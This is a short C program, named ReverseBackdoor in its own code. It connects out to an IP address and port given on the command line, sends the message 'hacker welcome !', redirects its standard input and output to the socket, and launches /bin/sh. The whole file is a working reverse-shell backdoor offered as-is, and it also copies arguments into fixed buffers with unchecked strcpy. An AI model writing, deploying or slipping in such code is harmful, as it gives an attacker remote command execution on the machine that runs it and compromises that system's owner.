#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define MAX_LEN (255)

char g_ip[MAX_LEN] = {0} ;
int g_port = 0 ;
char g_filepath[MAX_LEN] = {0} ;

int ReverseBackdoor(void) ;

int main(int argc, char **argv)
{
    int opt = 0 ;
    
    if(argc > 1)
    {
        while(-1 != (opt = getopt(argc, argv,"a:p:f:")))
        {
            switch(opt)
            {
                case 'a':
                    strcpy(g_ip, optarg) ;
                    break ;
                case 'p':
                    g_port = atoi(optarg) ;
                    break ;
                case 'f':
                    strcpy(g_filepath, optarg) ;
                    break ;
            }
        }

        printf("server: %s : %d\r\n", g_ip, g_port) ;
        printf("filepath: %s\r\n", g_filepath) ;
    }

    ReverseBackdoor() ;
    
    return 0 ;
}

int ReverseBackdoor(void)
{
    int sock ;
    struct sockaddr_in server = {0} ;
    if(strlen(g_ip) <= 0 || 0 == g_port || 65535 < g_port)
        return -1 ;
    
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        printf("Couldn't make socket!n"); 
        return -1 ;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(g_port);
    server.sin_addr.s_addr = inet_addr(g_ip);

    if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
    {
        printf("Could not connect to remote shell!n") ;
        close(sock) ;
        return -1;
    }
    #define MESSAGE "hacker welcome !"
    send(sock, MESSAGE, sizeof(MESSAGE), 0);
    printf("send %s", MESSAGE) ;
    #undef MESSAGE
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl("/bin/sh", "/bin/sh",(char *)0);
    close(sock);
}
